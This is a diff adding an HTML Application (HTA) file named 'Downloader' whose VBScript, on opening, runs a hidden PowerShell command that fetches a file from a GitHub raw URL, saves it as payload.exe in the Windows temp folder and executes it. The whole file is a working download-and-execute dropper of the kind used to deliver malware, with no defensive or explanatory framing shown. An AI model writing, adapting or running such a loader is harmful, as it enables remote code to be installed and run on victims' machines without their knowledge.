@@ -1,0 +1,37 @@
+<html>
+<head>
+  <title>Downloader</title>
+  <HTA:APPLICATION
+    ID="app"
+    APPLICATIONNAME="Downloader"
+    BORDER="thin"
+    BORDERSTYLE="normal"
+    CAPTION="yes"
+    SHOWINTASKBAR="yes"
+    SINGLEINSTANCE="yes"
+    SYSMENU="yes"
+    WINDOWSTATE="normal"
+  >
+  <script language="VBScript">
+    Dim downloadUrl, targetFile, shell
+    downloadUrl = "https://github.com/shy327/testSM/raw/refs/heads/main/testSMC"
+    targetFile = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\payload.exe"
+
+    Set shell = CreateObject("WScript.Shell")
+
+    MsgBox "[+] Downloading file via PowerShell...", 64, "Downloader"
+
+    shell.Run "powershell -Command ""try { Invoke-WebRequest '" & downloadUrl & "' -OutFile '" & targetFile & "' -UseBasicParsing } catch { Write-Host '[-] Download failed: ' + $_.Exception.Message }""", 0, True
+
+    If CreateObject("Scripting.FileSystemObject").FileExists(targetFile) Then
+      MsgBox "[+] Running downloaded file...", 64, "Downloader"
+      shell.Run """" & targetFile & """", 1, False
+    Else
+      MsgBox "[-] File was not downloaded successfully.", 16, "Downloader"
+    End If
+  </script>
+</head>
+<body>
+  <h2>Downloader is executing...</h2>
+</body>
+</html>
